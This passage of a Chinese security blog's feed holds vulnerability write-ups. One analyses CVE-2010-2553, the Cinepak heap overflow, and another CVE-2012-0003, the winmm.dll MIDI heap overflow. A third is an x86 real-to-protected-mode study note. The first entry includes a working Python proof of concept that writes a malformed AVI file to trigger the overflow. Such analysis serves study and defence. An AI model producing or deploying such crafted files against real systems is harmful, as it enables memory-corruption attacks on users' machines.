class="built_in">ebp</span>+arg_18]</span><br><span class="line"><span class="symbol">.text:</span>73B723C1                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+arg_14], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B723C4                 <span class="keyword">inc</span>     [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>73B723C7                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">2000h</span></span><br><span class="line"><span class="symbol">.text:</span>73B723CE                 <span class="keyword">xor</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span></span><br></pre></td></tr></table></figure><p>每次循环复制0x800字节数据，目标地址递增0x2000，堆块大小为0x6000，令0x1100的数据块超过三个就能造成堆溢出。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">aviHeaders = <span class="string">'\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">padding = <span class="string">'\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'</span></span><br><span class="line">movi_tag = <span class="string">'\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'</span></span><br><span class="line">cinepak_codec_data1 = <span class="string">'\x00\x00\x00\x68\x01\x60\x01\x20'</span></span><br><span class="line">number_of_coded_strips = <span class="string">'\x00\x10'</span> </span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br><span class="line">idx_tag = <span class="string">'\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">avifile = open(<span class="string">'poc.avi'</span>, <span class="string">'wb+'</span>)</span><br><span class="line">avifile.write(aviHeaders)</span><br><span class="line">avifile.write(padding)</span><br><span class="line">avifile.write(movi_tag)</span><br><span class="line">avifile.write(cinepak_codec_data1)</span><br><span class="line">avifile.write(number_of_coded_strips)</span><br><span class="line">avifile.write(cinepak_codec_data2)</span><br><span class="line">avifile.write(idx_tag)</span><br><span class="line"></span><br><span class="line">avifile.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/">https://kabeor.github.io/CVE-2010-2553 CVDecompress堆溢出分析/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2010-2553-CVDecompress堆溢出分析&quot;&gt;&lt;a href=&quot;#CVE-2010-2553-CVDecompress堆溢出分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2010-2553 CVDecompress堆溢出分
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2012-0003 MIDI 文件堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2012-0003%20MIDI%20%E6%96%87%E4%BB%B6%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出分析/</id>
    <published>2019-12-31T09:10:27.504Z</published>
    <updated>2019-12-31T09:17:18.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2012-0003-MIDI-文件堆溢出分析"><a href="#CVE-2012-0003-MIDI-文件堆溢出分析" class="headerlink" title="CVE-2012-0003 MIDI 文件堆溢出分析"></a>CVE-2012-0003 MIDI 文件堆溢出分析</h1><p>该漏洞成因主要是由于 winmm.dll 动态链接库在处理 MIDI 文件的 Note On 和 Note Off 字段没有做限制，导致可以操纵该字段访问堆块之外 1 个字节的内存空间；由于该漏洞过于特殊，所以在分析和利用的时候难度是相当大的。</p><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>IE6   wnimm.dll</p></blockquote><h2 id="MIDI-文件格式"><a href="#MIDI-文件格式" class="headerlink" title="MIDI 文件格式"></a>MIDI 文件格式</h2><p>MIDI 全称 Musical Instrument Digital Interface，是一种乐器数字接口（通过winmm.dll 链接库解析这种格式的文件之后可以播放出音乐）</p><p>总体来说 MIDI 可分为 “头块” 和若干多的 “音轨块”<br><img src="https://i.loli.net/2019/12/28/ACdeJFDR8tj9B6Y.png" alt></p><p>头块结构如下<br><img src="https://i.loli.net/2019/12/28/rpXTb2B1h4KeZED.png" alt></p><p>音轨事件如下<br><img src="https://i.loli.net/2019/12/28/wZozQXrlI1NOFmY.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>poc.html 样本中嵌入了一个音频播放器，由音频播放器来调用 toto.mid 文件播放音频从而触发漏洞</p><p>如果先运行windbg设置堆溢出检测标志，当前IE进程将无法运行poc，需要在命令行先设置gflag再运行windbg。</p><p><img src="https://i.loli.net/2019/12/28/ZKg4o5QFxMaGlkm.png" alt></p><p>F5 运行之后将 poc.html 文件拖入 IE，并且允许运行 ActiveX 控件<br>断下异常，可以看出 esi 指向的地址超出了堆空间，之后被堆页保护捕捉到<br><img src="https://i.loli.net/2019/12/28/C1SEImayw3O2QZV.png" alt></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="https://i.loli.net/2019/12/28/BypUiQqwgMhOVZ4.png" alt></p><p><img src="https://i.loli.net/2019/12/28/ZEVQ5P4FBgkUYJH.png" alt></p><p>shift + F4 对 v2、v9、v11、v13、v21、v23 和 v20 下条件记录断点，记录表达数值<br>v20 int3断点<br>运行poc后查看日志</p><p>分析看出 v11、v13、v21 相等<br>v2 不变，v20 最后才被记录，且指向的地址都在 0x07EC0000 往后的堆中<br>v23 的值，也就是 0x007DB29F 是来自漏洞样本的数据，结合MIDI 格式分析可以知道，9F 代表的就是打开音符（Note On），F 就是通道号</p><p>通道号 F 经过计算之后值为 419，控制着指针的偏移地址，也就是 v24 的值<br>v20 由传入的参数 wParam 控制，midiOutTimerTick函数调用了 midiOutPlayNextPolyEvent 函数，并且把 v6 当作参数传入，而 v6 = gpEmuList，gpEmuList在mseOpen 函数中被引用<br><img src="https://i.loli.net/2019/12/28/BzQLi83RXwCcbZM.png" alt></p><p>最后分析出v20=v6,因为 v6 是堆块的基地址，且这个堆块的大小为 0x400，所以 v20 也为这个 0x400 堆块的基地址</p><p>v25 的指针由 v24 和 v20 相加得出，v20 是堆的基址，而 v24 是样本数据解析运算获得，由于没有限制通道号的大小，导致运算后的偏移地址 v24 为 419，可是堆只有 0x400大小，很显然超出了申请的堆空间，照成了非法访问，故引发了堆页保护异常</p><p>From <a href="https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出分析/">https://kabeor.github.io/CVE-2012-0003 MIDI 文件堆溢出分析/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2012-0003-MIDI-文件堆溢出分析&quot;&gt;&lt;a href=&quot;#CVE-2012-0003-MIDI-文件堆溢出分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2012-0003 MIDI 文件堆溢出分析&quot;&gt;&lt;/a&gt;CVE-2012
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编-从实模式到保护模式</title>
    <link href="https://kabeor.github.io/x86%E6%B1%87%E7%BC%96%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    <id>https://kabeor.github.io/x86汇编从实模式到保护模式/</id>
    <published>2019-12-31T09:10:04.109Z</published>
    <updated>2019-12-31T09:10:58.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x86汇编-从实模式到保护模式"><a href="#x86汇编-从实模式到保护模式" class="headerlink" title="x86汇编-从实模式到保护模式"></a>x86汇编-从实模式到保护模式</h1><blockquote><p>注释</p></blockquote><p>注释必须以分号“;”开始。</p><blockquote><p>在屏幕上显示文字</p></blockquote><p>文本模式和图形模式是显卡的两种基本工作模式，可以用指令访问显卡，设置它的显示模式。在不同的工作模式下，显卡对显存内容的解释是不同的。</p><p>为了访问显存，也需要使用逻辑地址，也就是采用“段地址：偏移地址”的形式</p><p>Intel的处理器不允许将一个立即数传送到段寄存器，它只允许这样的指令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov 段寄存器，通用寄存器 </span><br><span class="line">mov 段寄存器，内存单元</span><br><span class="line"></span><br><span class="line">         mov ax,0xb800                 ;指向文本模式的显示缓冲区</span><br><span class="line">         mov es,ax</span><br></pre></td></tr></table></figure><blockquote><p>显示字符</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov byte [es:0x00],&apos;L&apos;</span><br><span class="line">mov byte [es:0x01],0x07          ;将属性值0x07传送到下一个内存单元</span><br><span class="line">mov byte [es:0x02],&apos;a&apos;</span><br><span class="line">mov byte [es:0x03],0x07</span><br><span class="line">mov byte [es:0x04],&apos;b&apos;</span><br><span class="line">mov byte [es:0x05],0x07</span><br></pre></td></tr></table></figure><blockquote><p>显示标号的汇编地址</p></blockquote><p>asm编译后，除了生成一个以“.bin”为扩展名的二进制文件，还会生成一个以“.lst”为扩展名的列表文件。这张表列出编译后生成的列表文件内容。</p><p>在编译阶段，每条指令都被计算并赋予了一个汇编地址，就像它们已经被加载到内存中的某个段里一样。实际上，当编译好的程序加载到物理内存后，它在段内的偏移地址和它在编译阶段的汇编地址是相等的。</p><p>源程序的编译是从上往下的，而内存地址的增长是从下往上的（从低地址往高地址方向增长）。</p><blockquote><p>loop</p></blockquote><p>loop指令的功能是重复执行一段相同的代码，处理器在执行它的时候会顺序做两件事： <strong>将寄存器CX的内容减一； 如果CX的内容不为零，转移到指定的位置处执行，否则顺序执行后面的指令。</strong></p><blockquote><p>计算1到100的和</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    xor ax,ax</span><br><span class="line">    mov cx,1</span><br><span class="line">@f:</span><br><span class="line">    add ax,cx</span><br><span class="line">    inc cx</span><br><span class="line">    cmp cx,100</span><br><span class="line">    jle @f</span><br></pre></td></tr></table></figure><blockquote><p>分段、段的汇编地址和段内汇编地址</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Intel处理器要求段在内存中的起始物理地址起码是16字节对齐的。这句话的意思是，必须是16的倍数，或者说该物理地址必须能被16整除。</span><br><span class="line">相应地，汇编语言源程序中定义的各个段，也有对齐方面的要求。具体做法是，在段定义中使用“align=”子句，用于指定某个SECTION的汇编地址对齐方式。比如说，“align=16”就表示段是16字节对齐的，“align=32”就表示段是32字节对齐的。</span><br><span class="line">段的重定位是加载器的工作，它需要知道每个段在用户程序内的位置，即它们分别位于用户程序内的多少字节处。为此，需要在用户程序头部建立一张段重定位表。</span><br></pre></td></tr></table></figure><blockquote><p>实模式下的中断向量表</p></blockquote><p>在实模式下，处理器要求将与该中断有关的程序（指令）的入口点集中存放到内存中从物理地址0x00000开始，到0x003ff结束，共1KB的空间内，这就是所谓的中断向量表（Interrupt Vector Table，IVT）。</p><blockquote><p>初始化8259、RTC和中断向量表</p></blockquote><p>当处理器执行任何一条改变堆栈段寄存器SS的指令时，它会在下一条指令执行完期间禁止中断。</p><p>绝大多数时候，对堆栈的改变是分两步进行的：先改变段寄存器SS的内容，接着又修改堆栈指针寄存器SP的内容。</p><blockquote><p>软 中 断</p></blockquote><p>int3和int 3不是一回事。前者的机器码为CC，后者则是CD 03，这就是通常所说的int n，其操作码为0xCD，第2字节的操作数给出了中断号。</p><p>into是溢出中断指令，机器码为0xCE，也是单字节指令。当处理器执行这条指令时，如果标志寄存器的OF位是1，那么，将产生4号中断。否则，这条指令什么也不做。</p><h2 id="32位保护模式"><a href="#32位保护模式" class="headerlink" title="32位保护模式"></a>32位保护模式</h2><blockquote><p>32位Intel微处理器编程架构</p></blockquote><p>80286和8086不一样的地方在于，它第一次提出了保护模式的概念。在保护模式下，段寄存器中保存的不再是段地址，而是段选择子，真正的段地址位于段寄存器的描述符高速缓存中，是24位的。因此，运行在保护模式下的80286处理器可以访问全部16MB内存。</p><p>在保护模式下，所有的32位处理器都可以访问多达4GB的内存，它们可以工作在分段模型下，每个段的基地址是32位的，段内偏移量也是32位的，因此，段的长度不受限制。在最典型的情况下，可以将整个4GB内存定义成一个段来处理，这就是所谓的平坦模式。在平坦模式下，可以执行4GB范围内的控制转移，也可以使用32位的偏移量访问任何4GB范围内的任何位置。32位保护模式兼容80286的16位保护模式。</p><p>在实模式下，用户程序对内存的访问非常自由，没有任何限制，随随便便就可以修改任何一个内存单元。</p><blockquote><p>全局描述符表</p></blockquote><p>为了让程序在内存中能自由浮动而又不影响它的正常执行，处理器将内存划分成逻辑上的段，并在指令中使用段内偏移地址。在保护模式下，对内存的访问仍然使用段地址和偏移地址，但是，在每个段能够访问之前，必须先进行登记。</p><p>和一个段有关的信息需要8个字节来描述，所以称为段描述符（Segment Descriptor），每个段都需要一个描述符。为了存放这些描述符，需要在内存中开辟出一段空间。在这段空间里，所有的描述符都是挨在一起，集中存放的，这就构成一个描述符表。<br>       最主要的描述符表是全局描述符表（Global Descriptor Table，GDT），所谓全局，意味着该表是为整个软硬件系统服务的。在进入保护模式前，必须要定义全局描述符表。</p><p>描述符不是由用户程序自己建立的，而是在加载时，由操作系统根据你的程序结构而建立的，而用户程序通常是无法建立和修改GDT的。</p><blockquote><p>存储器的段描述符</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">段基地址可以是0～4GB范围内的任意地址，不过，还是建议应当选取那些16字节对齐的地址。尽管对于Intel处理器来说，允许不对齐的地址，但是，对齐能够使程序在访问代码和数据时的性能最大化。这一点，对于那些学过计算机原理，特别是了解内存芯片组织的人来说，是最清楚不过的。</span><br><span class="line">20位的段界限用来限制段的扩展范围。因为访问内存的方法是用段基地址加上偏移量，所以，对于向上扩展的段，如代码段和数据段来说，偏移量是从0开始递增，段界限决定了偏移量的最大值；对于向下扩展的段，如堆栈段来说，段界限决定了偏移量的最小值。</span><br><span class="line">G位是粒度（Granularity）位，用于解释段界限的含义。当G位是“0”时，段界限以字节为单位。此时，段的扩展范围是从1字节到1兆字节（1B～1MB），因为描述符中的界限值是20位的。相反，如果该位是“1”，那么，段界限是以4KB为单位的。这样，段的扩展范围是从4KB到4GB。</span><br><span class="line">S位用于指定描述符的类型（Descriptor Type）。当该位是“0”时，表示是一个系统段；为“1”时，表示是一个代码段或者数据段（堆栈段也是特殊的数据段）。系统段将在以后介绍。</span><br><span class="line">DPL表示描述符的特权级（Descriptor Privilege Level，DPL）。这两位用于指定段的特权级。共有4种处理器支持的特权级别，分别是0、1、2、3，其中0是最高特权级别，3是最低特权级别。刚进入保护模式时执行的代码具有最高特权级0（可以看成是从处理器那里继承来的），这些代码通常都是操作系统代码，因此它的特权级别最高。每当操作系统加载一个用户程序时，它通常都会指定一个稍低的特权级，比如3特权级。不同特权级别的程序是互相隔离的，其互访是严格限制的，而且有些处理器指令（特权指令）只能由0特权级的程序来执行，为的就是安全。</span><br><span class="line">P是段存在位（Segment Present）。P位用于指示描述符所对应的段是否存在。一般来说，描述符所指示的段都位于内存中。但是，当内存空间紧张时，有可能只是建立了描述符，对应的内存空间并不存在，这时，就应当把描述符的P位清零，表示段并不存在。另外，同样是在内存空间紧张的情况下，会把很少用到的段换出到硬盘中，腾出空间给当前急需内存的程序使用（当前正在执行的），这时，同样要把段描述符的P位清零。当再次轮到它执行时，再装入内存，然后将P位置1。</span><br><span class="line">P位是由处理器负责检查的。每当通过描述符访问内存中的段时，如果P位是“0”，处理器就会产生一个异常中断。通常，该中断处理过程是由操作系统提供的，该处理过程的任务是负责将该段从硬盘换回内存，并将P位置1。在多用户、多任务的系统中，这是一种常用的虚拟内存调度策略。当内存很小，运行的程序很多时，如果计算机的运行速度变慢，并伴随着繁忙的硬盘操作时，说明这种情况正在发生。</span><br><span class="line">D/B位是“默认的操作数大小”（Default Operation Size）或者“默认的堆栈指针大小”（Default Stack Pointer Size），又或者“上部边界”（Upper Bound）标志。</span><br></pre></td></tr></table></figure><blockquote><p>安装存储器的段描述符并加载GDTR</p></blockquote><p>处于实模式下，在GDT中安装描述符，必须将GDT的线性地址转换成段地址和偏移地址。</p><p>处理器规定，GDT中的第一个描述符必须是空描述符，或者叫哑描述符或NULL描述符。</p><blockquote><p>保护模式下的内存访问</p></blockquote><p>控制这达实模式和保护模式切换的开关是在一个叫CR0的寄存器。</p><p>CR0是处理器内部的控制寄存器（Control Register，CR）。之所以有个“0”后缀，是因为还有CR1、CR2、CR3和CR4控制寄存器，甚至还有CR8。<br>        CR0是32位的寄存器，包含了一系列用于控制处理器操作模式和运行状态的标志位。它的第1位（位0）是保护模式允许位（Protection Enable，PE），是开启保护模式大门的门把手，如果把该位置“1”，则处理器进入保护模式，按保护模式的规则开始运行。</p><p>保护模式下的中断机制和实模式不同，因此，原有的中断向量表不再适用，而且，必须要知道的是，在保护模式下，BIOS中断都不能再用，因为它们是实模式下的代码。在重新设置保护模式下的中断环境之前，必须关中断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cli                                ;保护模式下中断机制尚未建立，应 </span><br><span class="line">                                   ;禁止中断 </span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure><p>在保护模式下访问一个段时，传送到段选择器的是段选择子。它由三部分组成，第一部分是描述符的索引号，用来在描述符表中选择一个段描述符。TI 是描述符表指示器（Table Indicator），TI＝0 时，表示描述符在GDT 中；TI＝1 时，描述符在LDT 中。LDT 也是一个描述符表，和GDT 类似。RPL 是请求特权级，表示给出当前选择子的那个程序的特权级别，正是该程序要求访问这个内存段。每个程序都有特权级别，</p><blockquote><p>清空流水线并串行化处理器</p></blockquote><p>即使是在实模式下，段寄存器的描述符高速缓存器也被用于访问内存，仅低20位有效，高12位是全零。当处理器进入保护模式后，不影响段寄存器的内容和使用，它们依然是有效的，程序可以继续执行。但是，在保护模式下，对段的解释是不同的，处理器会把段选择器里的内容看成是描述符选择子，而不是逻辑段地址。因此，比较安全的做法是尽快刷新CS、SS、DS、ES、FS和GS的内容，包括它们的段选择器和描述符高速缓存器。</p><p>在进入保护模式前，有很多指令已经进入了流水线。因为处理器工作在实模式下，所以它们都是按16位操作数和16位地址长度进行译码的，即使是那些用bits 32编译的指令。进入保护模式后，由于对段地址的解释不同，对操作数和默认地址大小的解释也不同，有些指令的执行结果可能会不正确，所以必须清空流水线。同时，那些通过乱序执行得到的中间结果也是无效的，必须清理掉，让处理器串行化执行，即，重新按指令的自然顺序执行。</p><p>使用32位远转移指令jmp或者远过程调用指令call。处理器最怕转移指令，遇到这种指令，一般会清空流水线，并串行化执行；另一方面，远转移会重新加载段选择器CS，并刷新描述符高速缓存器中的内容。唯一的问题是，这条指令必须在bits 16下编译，使得处理器能够在16位模式下正确译码；同时，还必须编译成32位操作数的指令，使处理器在刚进入保护模式时能正确执行。<strong>一个建议的方法是在设置了控制寄存器CR0的PE位之后，立即用jmp或者call转移到当前指令流的下一条指令上。</strong></p><blockquote><p>保护模式下的堆栈</p></blockquote><p>堆栈是向下扩展的，因此，描述符中的段界限，和向上扩展的段含义不同。对于向上扩展的段，段内偏移量是从0开始递增，偏移量的最大值是界限值和粒度的乘积；而对于向下扩展的段来说，因为它经常用做堆栈段，而堆栈是从高地址向低地址方向推进的，故段内偏移量的最小值是界限值和粒度的乘积加一。在32位代码中，是用ESP作为堆栈指针的。因此，这里的段界限，用来和段粒度一起，决定ESP寄存器所能具有的最小值。即，堆栈操作时，必须符合条件： </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ESP ＞ 段界限×粒度值</span><br></pre></td></tr></table></figure><p>对于描述符中G位是“0”的段来说，粒度值是1（字节）；而对于G位是“1”的段来说，粒度值是4096（4KB）。</p><blockquote><p>进入32位保护模式</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;设置堆栈段和栈指针 </span><br><span class="line">mov eax,cs      </span><br><span class="line">mov ss,eax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line">      </span><br><span class="line">;计算GDT所在的逻辑段地址</span><br><span class="line">mov eax,[cs:pgdt+0x7c00+0x02]      ;GDT的32位线性基地址 </span><br><span class="line">xor edx,edx</span><br><span class="line">mov ebx,16</span><br><span class="line">div ebx                            ;分解成16位逻辑地址 </span><br><span class="line"></span><br><span class="line">mov ds,eax                         ;令DS指向该段以进行操作</span><br><span class="line">mov ebx,edx                        ;段内起始偏移地址 </span><br><span class="line"></span><br><span class="line">;创建0#描述符，它是空描述符，这是处理器的要求</span><br><span class="line">mov dword [ebx+0x00],0x00000000</span><br><span class="line">mov dword [ebx+0x04],0x00000000  </span><br><span class="line"></span><br><span class="line">;创建1#描述符，这是一个数据段，对应0~4GB的线性地址空间</span><br><span class="line">mov dword [ebx+0x08],0x0000ffff    ;基地址为0，段界限为0xfffff</span><br><span class="line">mov dword [ebx+0x0c],0x00cf9200    ;粒度为4KB，存储器段描述符 </span><br><span class="line"></span><br><span class="line">;创建保护模式下初始代码段描述符</span><br><span class="line">mov dword [ebx+0x10],0x7c0001ff    ;基地址为0x00007c00，512字节 </span><br><span class="line">mov dword [ebx+0x14],0x00409800    ;粒度为1个字节，代码段描述符 </span><br><span class="line"></span><br><span class="line">;创建以上代码段的别名描述符</span><br><span class="line">mov dword [ebx+0x18],0x7c0001ff    ;基地址为0x00007c00，512字节</span><br><span class="line">mov dword [ebx+0x1c],0x00409200    ;粒度为1个字节，数据段描述符</span><br><span class="line"></span><br><span class="line">mov dword [ebx+0x20],0x7c00fffe</span><br><span class="line">mov dword [ebx+0x24],0x00cf9600</span><br><span class="line"></span><br><span class="line">;初始化描述符表寄存器GDTR</span><br><span class="line">mov word [cs: pgdt+0x7c00],39      ;描述符表的界限   </span><br><span class="line"> </span><br><span class="line">lgdt [cs: pgdt+0x7c00]</span><br><span class="line">      </span><br><span class="line">in al,0x92                         ;南桥芯片内的端口 </span><br><span class="line">or al,0000_0010B</span><br><span class="line">out 0x92,al                        ;打开A20</span><br><span class="line"></span><br><span class="line">cli                                ;中断机制尚未工作</span><br><span class="line"></span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure><blockquote><p>内核的结构</p></blockquote><p>内核分为四个部分，分别是初始化代码、内核代码段、内核数据段和内核例程段，主引导程序也是初始化代码的组成部分。</p><p>初始化代码用于从BIOS那里接管处理器和计算机硬件的控制权，安装最基本的段描述符，初始化最初的执行环境。然后，从硬盘上读取和加载内核的剩余部分，创建组成内核的各个内存段。</p><p>内核代码段用于分配内存，读取和加载用户程序，控制用户程序的执行。</p><p>内核数据段提供了一段可读写的内存空间，供内核自己使用。<br>       内核例程段用于提供各种用途和功能的子过程以简化代码的编写。这些例程既可以用于内核，也供用户程序调用。</p><p>内核文件还包括一个头部，记录了各个段的汇编位置，这些统计数<br>据用于告诉初始化代码如何加载内核。</p><p>From <a href="https://kabeor.github.io/x86汇编从实模式到保护模式/">https://kabeor.github.io/x86汇编从实模式到保护模式/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;x86汇编-从实模式到保护模式&quot;&gt;&lt;a href=&quot;#x86汇编-从实模式到保护模式&quot; class=&quot;headerlink&quot; title=&quot;x86汇编-从实模式到保护模式&quot;&gt;&lt;/a&gt;x86汇编-从实模式到保护模式&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;注释&lt;/p
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
